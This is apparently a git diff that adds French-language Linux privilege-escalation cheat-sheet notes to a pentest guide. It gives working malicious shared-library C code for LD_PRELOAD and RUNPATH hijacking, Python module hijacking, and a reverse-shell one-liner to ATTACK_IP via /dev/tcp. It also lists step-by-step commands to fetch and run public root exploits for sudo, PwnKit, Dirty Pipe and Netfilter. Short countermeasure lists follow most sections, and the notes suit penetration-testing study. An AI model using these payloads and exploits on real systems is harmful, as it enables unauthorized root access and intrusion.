@@ -1268,11 +1268,337 @@ whoami
 
 ---
 
+# Shared Libraries
 
+## 1) Principe
+Les programmes Linux utilisent souvent des **bibliothèques partagées** (`.so`) chargées dynamiquement à l’exécution.  
+Cela permet de réutiliser du code commun (ex: `libc.so`, `libpthread.so`).  
 
+Deux types :
+- **.a** → statiques (intégrées au binaire)
+- **.so** → dynamiques (chargées à l’exécution)
 
+Les chemins de recherche des bibliothèques peuvent être définis via :
+- **LD_LIBRARY_PATH**
+- **/lib**, **/usr/lib**
+- **/etc/ld.so.conf**
+- **-rpath** au moment de la compilation
 
+## 2) Vérifier les bibliothèques utilisées par un binaire
+```bash
+ldd /bin/ls
+```
+→ affiche les `.so` chargées par le programme.
 
+## 3) LD_PRELOAD — Privilege Escalation
+
+**LD_PRELOAD** permet de forcer le chargement d’une bibliothèque avant les autres.  
+Si un utilisateur peut exécuter une commande `sudo` avec `env_keep+=LD_PRELOAD`,  
+il peut charger une bibliothèque malveillante pour obtenir **root**.
+
+### Vérification :
+```bash
+sudo -l
+```
+Exemple :
+```
+(env_keep+=LD_PRELOAD)
+(root) NOPASSWD: /usr/sbin/apache2 restart
+```
+
+## 4) Création de la bibliothèque malveillante
+Fichier `root.c` :
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+Compiler :
+```bash
+gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
+```
+
+---
+
+## 5) Exploitation
+```bash
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+id
+# uid=0(root)
+```
+
+**Shell root obtenu via injection de bibliothèque partagée.**
+
+## 6) Contremesures
+- Supprimer `env_keep+=LD_PRELOAD` dans `/etc/sudoers`.  
+- Restreindre `sudo` à des commandes sûres sans variables d’environnement héritées.  
+- Protéger `/tmp` (exécution interdite).  
+- Surveiller les `.so` inhabituelles via `auditd`.
+
+---
+
+# Shared Object Hijacking 
+
+## Principe
+Un binaire (`setuid` ou non) peut charger des bibliothèques partagées depuis des chemins définis (RUNPATH / RPATH, `LD_LIBRARY_PATH`, etc.).  
+Si le chemin prioritaire est écrivable par un attaquant, on peut déposer une `.so` malveillante qui exporte les symboles attendus par le binaire et exécuter du code avec les droits du binaire (ex: `root`).
+
+## Vérifications rapides
+- Voir les dépendances : `ldd payroll`  
+- Voir le `RUNPATH` / `RPATH` : `readelf -d payroll | grep PATH`  
+- Inspecter les permissions du dossier : `ls -la /development/`
+
+Exemple d'entrée dangereuse : `RUNPATH: [/development]` et `/development` world-writable.
+
+## Exploitation
+1. `ldd payroll` montre `libshared.so => /development/libshared.so`  
+2. Le dossier `/development` est modifiable par l'attaquant.  
+3. Trouver le symbole manquant (ex: erreur `undefined symbol: dbquery` lors d'exécution).  
+4. Créer une `.so` qui définit la fonction requise et exécute ce que vous voulez (ex : `setuid(0)` + shell).  
+5. Compiler et placer `/development/libshared.so`.  
+6. Lancer `./payroll` → la fonction de la `.so` est appelée → shell avec les droits du binaire.
+
+## Exemple de `dbquery` malveillant (C)
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+
+    void dbquery() {
+        printf("Malicious library loaded\n");
+        setuid(0);
+        system("/bin/sh -p");
+    }
+
+Compiler :
+`gcc src.c -fPIC -shared -o /development/libshared.so`
+
+Exécution :
+`./payroll`  
+=> bannière + `Malicious library loaded` + shell (UID 0 si binaire setuid root)
+
+## Contremesures
+- Ne pas utiliser de chemins `RUNPATH` écrits par des utilisateurs non fiables.  
+- Restreindre les permissions des dossiers `/development` (ne pas les rendre world-writable).  
+- Supprimer `setuid` si inutile ; sinon code review + compilation sûre.  
+- Utiliser `ld.so` namespace, vérifier `LD_LIBRARY_PATH`/env héritées (sudoers).  
+- Auditer les bins `setuid`: `find / -user root -perm -4000 -type f 2>/dev/null`  
+- Surveiller modifications dans dossiers de bibliothèques avec `auditd`.
+
+---
+
+# Python Library Hijacking — cheat-sheet courte
+
+## Principe
+Un script Python importe des modules selon un ordre (`sys.path`). Si un attaquant peut écrire dans un répertoire qui est **plus haut** dans `sys.path` que la vraie bibliothèque, ou modifier la bibliothèque elle-même, il peut faire exécuter du code arbitraire par le script (potentiellement en root si le script est SUID/sudoable).
+
+---
+
+## Vecteurs courants
+1. **Permissions des fichiers/modules** — la vraie bibliothèque est modifiable par l'attaquant.  
+2. **Ordre de recherche (`sys.path`)** — créer un fichier `<module>.py` dans un répertoire prioritaire.  
+3. **`PYTHONPATH` / variables d'environnement** — si on peut définir `PYTHONPATH` pour sudo/python (SETENV), on force l'import depuis un répertoire contrôlé.
+
+---
+
+## Vérifs rapides
+- Quel est le script ? `ls -l mem_status.py` (SUID ? propriétaire ?)  
+- Où est installé le module : `pip3 show psutil` → `Location:`  
+- Ordre d'import : `python3 -c 'import sys; print("\n".join(sys.path))'`  
+- Permissions de chemins importants : `ls -la /usr/lib/python3.8 /usr/local/lib/python3.8`  
+- Sudo + possibilité SETENV : `sudo -l`
+
+---
+
+## Exploitation (résumé)
+### A) Modifier la bibliothèque existante (si écrivable)
+1. Éditer `/usr/local/lib/.../psutil/__init__.py` (ou le fichier ciblé).  
+2. Insérer code malveillant (ex : `import os; os.system('id')`) au début de la fonction ciblée.  
+3. Lancer le script : `sudo /usr/bin/python3 ./mem_status.py` → exécution sous root.
+
+### B) Préférer un module contrôlé (sys.path)
+1. Créer `/usr/lib/python3.8/psutil.py` (ou autre répertoire plus haut dans `sys.path`) — même nom de module et fonctions attendues.  
+2. Contenu minimal :
+```python
+#!/usr/bin/env python3
+import os
+def virtual_memory():
+    os.system('id')   # ou reverse shell
+    return None
+```
+`sudo /usr/bin/python3 mem_status.py` → code exécuté.
+
+### C) Via PYTHONPATH (si sudo autorise SETENV)
+
+`sudo PYTHONPATH=/tmp /usr/bin/python3 ./mem_status.py` (utiliser /tmp/psutil.py contrôlé)
+
+Exemples de payloads utiles : 
+
+simple commande : `os.system('/bin/sh -c "id >/tmp/out"')`
+
+reverse shell (one-liner) : `os.system('bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1')`
+
+### Contremesures & bonnes pratiques
+- Ne pas placer de scripts SUID qui invoquent l’interpréteur Python ; éviter SUID sur scripts interprétés.
+- Restreindre les permissions des répertoires de modules (`/usr/lib, /usr/local/lib`) : pas world-writable.
+- Pour sudo : interdire SETENV sauf si nécessaire ; limiter sudo aux binaires précis sans variables d’environnement héritées.
+- Utiliser des environnements virtuels (`venv`) pour isoler dépendances.
+- Code review pour imports dynamiques ; ne jamais exécuter sudo python sur des scripts non audités.
+- Surveillance (tripwire, audits) sur modifications de modules système.
+
+---
+
+# Sudo
+
+## Principe  
+`sudo` permet d’exécuter des commandes avec les droits d’un autre utilisateur (souvent `root`) selon `/etc/sudoers`. Commence toujours par vérifier tes droits.
+
+## Vérifications rapides
+- Lister les droits sudo de l’utilisateur (sans mot de passe si possible) : `sudo -l`  
+- Version de sudo : `sudo -V | head -n1`  
+- Afficher le sudoers (si accessible) : `sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'`
+
+## Cas d’exploitation
+### CVE-2021-3156 (heap overflow — « baron samedit »)
+- Versions touchées notables : `1.8.21` … `1.8.31` selon la distribution.  
+- PoC : cloner le dépôt et compiler, puis exécuter le PoC adapté à la cible :
+  - `git clone https://github.com/blasty/CVE-2021-3156.git`
+  - `cd CVE-2021-3156 && make`
+  - `./sudo-hax-me-a-sandwich <target-id>`
+  ⚠️ Risque d’instabilité système — n’utiliser qu’en test ou avec autorisation.
+
+### CVE-2019-14287 (policy bypass via UID négatif)
+- Affecte certaines versions plus anciennes. Si `sudo -l` montre une commande autorisée, tester : `sudo -u#-1 id`  
+  Ceci peut retourner un shell `root` si la version est vulnérable.
+
+## Astuces d’exploitation
+- Si tu peux lancer un binaire via `sudo`, vérifie ses options (cf. GTFOBins).  
+- Regarde `Defaults` et `env_keep` dans la sortie de `sudo -l`. Si `LD_PRELOAD` ou `PYTHONPATH` sont conservés, possible abuse via variables d’environnement :  
+  - `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/somebinary`  
+  - `sudo PYTHONPATH=/tmp /usr/bin/python3 script.py`
+
+---
+
+# Polkit
+
+## Principe  
+`polkit` (PolicyKit) est un service d’autorisation qui permet aux processus non-privilégiés de demander l’autorisation d’exécuter des actions système. Les règles/actions sont définies sous `/usr/share/polkit-1/actions` et `/usr/share/polkit-1/rules.d`. Les règles locales se placent dans `/etc/polkit-1/localauthority/50-local.d/*.pkla`.
+
+### Outils utiles
+- `pkexec` — exécuter une commande en tant qu’autre utilisateur (similaire à `sudo`).  
+- `pkaction` — lister les actions disponibles.  
+- `pkcheck` — vérifier si une action est autorisée.
+
+## Vérifications rapides
+- Tester `pkexec` : `pkexec -u root id`  
+- Lister les actions : `pkaction`  
+- Vérifier une action spécifique : `pkcheck --action-id org.freedesktop.policykit.exec` (adapter l’action)  
+- Rechercher règles locales : `ls -la /etc/polkit-1/localauthority/50-local.d/`
+
+## Exploits connus
+### CVE-2021-4034 — PwnKit (PwnKit / pkexec local root)  
+- Impact : exécution locale non-authenticated → élévation en `root`.  
+- PoC (exemple) :
+  - `git clone https://github.com/arthepsy/CVE-2021-4034.git`
+  - `cd CVE-2021-4034`
+  - `gcc cve-2021-4034-poc.c -o poc`
+  - `./poc` → si réussi, `id` retourne `uid=0(root)`
+
+## Bonnes pratiques / contremesures
+- Mettre à jour/patcher `polkit` vers la version corrigée.  
+- Restreindre accès aux fichiers de règles et éviter règles .pkla permissives.  
+- Surveiller usages anormaux de `pkexec` et des actions polkit (logs système).  
+- Appliquer principe du moindre privilège : n’accorder que les actions strictement nécessaires.
+
+---
+
+# Dirty Pipe
+
+## Principe  
+`Dirty Pipe` (CVE-2022-0847) est une vulnérabilité du noyau Linux permettant à un utilisateur ayant **lecture** sur un fichier d'écrire arbitrairement dedans via une mauvaise gestion des *pipes*. Impact : noyaux **5.8 → 5.17** (vulnérables). Android aussi concerné.
+
+> ⚠️ Risque élevé — peut corrompre le système.
+
+## Vérifications rapides
+- Vérifier la version du noyau : `uname -r`  
+- Confirmer plage vulnérable : si noyau entre `5.8` et `5.17` → susceptible.  
+
+## Exploitation (procédure condensée)
+1. Récupérer PoC et compiler :
+   - `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git`
+   - `cd CVE-2022-0847-DirtyPipe-Exploits`
+   - `bash compile.sh`  
+2. Option A — modifier `/etc/passwd` (exploit-1) :
+   - `./exploit-1` → suit les instructions (fait un backup et pop root shell).  
+3. Option B — patcher un binaire SUID (exploit-2) :
+   - Lister SUID : `find / -perm -4000 2>/dev/null`
+   - `./exploit-2 /chemin/vers/binaire_suid` (ex : `/usr/bin/sudo`) → obtient shell root via SUID temporaire.
+
+## Nettoyage & sécurité
+- Toujours sauvegarder (`/tmp/passwd.bak`, etc.) avant modification.  
+- Supprimer artefacts après usage (`/tmp/sh`, backups temporaires).  
+- Patch/mettre à jour le noyau ou appliquer correctifs fournis par la distribution dès que possible.
+
+## Ressources
+- [PoC DirtyPipe (exploits repo)](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits): PoC et instructions.  
+- [CVE-2022-0847 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2022-0847): détails CVE.
+
+---
+
+# Netfilter
+
+## Principe  
+`Netfilter` est un sous-système du noyau Linux responsable du filtrage de paquets, NAT et connection tracking (outil côté user: `iptables` / `nftables`). Plusieurs vulnérabilités kernel liées à Netfilter permettent une **élévation locale de privilèges** (exécution de code noyau / root). Ces PoC peuvent rendre le système instable ou nécessiter un reboot.
+
+> ⚠️ Les exploits kernel peuvent corrompre le système.
+
+## CVE notables (exemples)
+- **CVE-2021-22555** — vulnérabilités netfilter (out-of-bounds / mémoire) affectant de nombreuses versions (ex : kernels <= ~5.11).  
+- **CVE-2022-25636** — heap OOB write dans `nf_dup_netdev.c` (ex : kernels 5.4 → 5.6.x).  
+- **CVE-2023-32233** — Use-After-Free sur anonymous sets dans `nf_tables` (affecte kernels jusqu’à ~6.3.1).
+
+## Vérifications rapides
+- Voir la version du noyau : `uname -r`  
+- Si noyau dans la plage vulnérable → rechercher PoC/patches spécifiques.  
+- Toujours snapshot / sauvegarder VM avant test.
+
+## Exploitation
+> Les PoC diffèrent selon la vuln; pattern général :
+1. Récupérer le PoC correspondant :  
+   - `git clone <repo_poc>` ou `wget <exploit.c>`  
+2. Compiler (exemples) :  
+   - `gcc -m32 -static exploit.c -o exploit`  
+   - `make` (si Makefile fourni)  
+   - `gcc -Wall -o exploit exploit.c -lmnl -lnftnl` (pour certains nf_tables PoC)  
+3. Lancer l'exécutable : `./exploit`  
+4. Si réussite → `id` montre `uid=0(root)`.
+
+## Précautions & nettoyage
+- Tester d'abord sur une VM clonée.  
+- Sur plantage kernel : plan de restauration / snapshot, accès console KVM.  
+- Supprimer les binaires PoC et les sources après usage.  
+- Appliquer les correctifs / mettre à jour le noyau dès que possible.
+
+## Ressources utiles
+- [Google security-research — CVE-2021-22555 PoC](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555) : PoC & explications.  
+- [Bonfee — CVE-2022-25636](https://github.com/Bonfee/CVE-2022-25636) : exploit PoC (attention stabilité).  
+- [Liuk3r — CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233) : PoC nf_tables UAF.  
+- [NVD / CVE entries](https://nvd.nist.gov/) : rechercher `CVE-2021-22555`, `CVE-2022-25636`, `CVE-2023-32233` pour détails & patches.
+
+## Remarque finale  
+Les vulnérabilités Netfilter ciblent le noyau : elles sont puissantes mais dangereuses. Préférer d’abord les chemins moins destructifs (sudo abuse, services vulnérables, misconfigurations) avant d’essayer des exploits kernel en test réel.
+
+---
+
+# Outil utile pour l'audit des systèmes Unix (Linux, macOS, BDS, etc.)
+[Lynis](https://github.com/CISOfy/lynis)
 
 
 
